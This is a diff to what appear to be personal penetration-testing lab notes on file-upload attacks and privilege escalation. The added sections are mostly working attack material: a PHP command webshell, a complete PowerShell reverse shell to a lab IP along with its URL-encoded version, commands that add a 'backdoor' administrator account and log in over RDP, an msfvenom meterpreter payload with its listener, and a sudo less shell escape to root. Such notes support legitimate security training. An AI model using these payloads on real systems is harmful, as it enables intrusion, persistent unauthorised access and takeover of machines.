@@ -119,7 +119,7 @@ msfvenom --list payloads | grep <filter for os, arch etc.>
 - We are given a webserver vulnerable to file inclusion. 
 - We start off by uploading a light php webshell:
 ```PHP
-`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`
+<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
 ```
 
 Then we can execute commands via the url:
@@ -138,6 +138,58 @@ We upload a better shell and execure it via the webshell:
 - We upload a php reverse shell: `/usr/share/webshells/php/php-reverse-shell.php`
 
 Then maybe we managed to get some credential files, and manage to ssh into the machine. 
+
+#### Case problem (windows target):
+
+- We have the same file upload vulnerability. So we try upload a php webshell, and it works. (same default php shell)
+- Now we want to use the ps1 super payload, we just need to url encode it:
+
+```powershell 
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.123.128',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+```
+
+We use burp to url encode (the online tool was a bit messy, did not work?), so the payload it:
+```
+%70%6f%77%65%72%73%68%65%6c%6c%20%2d%63%20%22%24%63%6c%69%65%6e%74%20%3d%20%4e%65%77%2d%4f%62%6a%65%63%74%20%53%79%73%74%65%6d%2e%4e%65%74%2e%53%6f%63%6b%65%74%73%2e%54%43%50%43%6c%69%65%6e%74%28%27%31%30%2e%31%31%2e%31%32%33%2e%31%32%38%27%2c%34%34%34%34%29%3b%24%73%74%72%65%61%6d%20%3d%20%24%63%6c%69%65%6e%74%2e%47%65%74%53%74%72%65%61%6d%28%29%3b%5b%62%79%74%65%5b%5d%5d%24%62%79%74%65%73%20%3d%20%30%2e%2e%36%35%35%33%35%7c%25%7b%30%7d%3b%77%68%69%6c%65%28%28%24%69%20%3d%20%24%73%74%72%65%61%6d%2e%52%65%61%64%28%24%62%79%74%65%73%2c%20%30%2c%20%24%62%79%74%65%73%2e%4c%65%6e%67%74%68%29%29%20%2d%6e%65%20%30%29%7b%3b%24%64%61%74%61%20%3d%20%28%4e%65%77%2d%4f%62%6a%65%63%74%20%2d%54%79%70%65%4e%61%6d%65%20%53%79%73%74%65%6d%2e%54%65%78%74%2e%41%53%43%49%49%45%6e%63%6f%64%69%6e%67%29%2e%47%65%74%53%74%72%69%6e%67%28%24%62%79%74%65%73%2c%30%2c%20%24%69%29%3b%24%73%65%6e%64%62%61%63%6b%20%3d%20%28%69%65%78%20%24%64%61%74%61%20%32%3e%26%31%20%7c%20%4f%75%74%2d%53%74%72%69%6e%67%20%29%3b%24%73%65%6e%64%62%61%63%6b%32%20%3d%20%24%73%65%6e%64%62%61%63%6b%20%2b%20%27%50%53%20%27%20%2b%20%28%70%77%64%29%2e%50%61%74%68%20%2b%20%27%3e%20%27%3b%24%73%65%6e%64%62%79%74%65%20%3d%20%28%5b%74%65%78%74%2e%65%6e%63%6f%64%69%6e%67%5d%3a%3a%41%53%43%49%49%29%2e%47%65%74%42%79%74%65%73%28%24%73%65%6e%64%62%61%63%6b%32%29%3b%24%73%74%72%65%61%6d%2e%57%72%69%74%65%28%24%73%65%6e%64%62%79%74%65%2c%30%2c%24%73%65%6e%64%62%79%74%65%2e%4c%65%6e%67%74%68%29%3b%24%73%74%72%65%61%6d%2e%46%6c%75%73%68%28%29%7d%3b%24%63%6c%69%65%6e%74%2e%43%6c%6f%73%65%28%29%22
+```
+
+- Now that we have a ps, we can make a new user with admin privs:
+```
+net user backdoor P@ssw0rd123 /add
+```
+
+```
+net localgroup Administrators backdoor /add
+```
+
+- Verify we have made it correctly:
+```
+net user backdoor
+```
+
+- Connecting to the new user we added via RDP:
+```
+xfreerdp /u:backdoor /p:P@ssw0rd123 /v:10.10.140.254
+```
+
+##### We can also inject a msfvenom payload to get a meterpeter shell:
+
+```
+msfvenom -p windows/x64/meterpreter_reverse_tcp -f exe -o shell.exe LHOST=10.11.123.128 LPORT=4444
+```
+
+- We execute the shell.exe with out webshell on the target, and setup a listener with msfconsole:
+```
+use multi/handler
+
+set PAYLOAD windows/x64/meterpreter_reverse_tcp
+set LHOST ...
+set LPORT ...
+
+Then we run the listener:
+exploit
+```
 
 
 
@@ -164,6 +216,12 @@ Example of uploading payload, running it and gaining root.
 
 
 #### PrivEsc commands with "sudo permission":
+
+**SUID, SGID, sticky bit**
+![[Pasted image 20250208134258.png]]
+
+
+
 Some doc: https://gtfobins.github.io/ 
 
 TIPS: Good practise to check the files/program that have the s'bit set: 
@@ -184,6 +242,17 @@ NOTE: when a program has the s bit set, it means that the program will run with 
 
 **Basic tactics for privilege escalation - if we have sudo access to a text editor:**
 - Reading and cracking the `/etc/shadow` file or adding a new user to the `/etc/passwd` file which have permission to run a root shell. 
+
+**Another Example:**
+
+- We have sudo premissions for the less command. 
+- We read the doc and see that:
+```
+sudo less /etc/profile
+!/bin/sh
+```
+
+- That is, once we go into the "less shell" we run the last command to get root shell. 
 
 #### PrivEsc commands with "capabilities":
 - The s bit might not be set, but a command could have sudo premissions to run a command via capabilities. We can list a users capabilities:
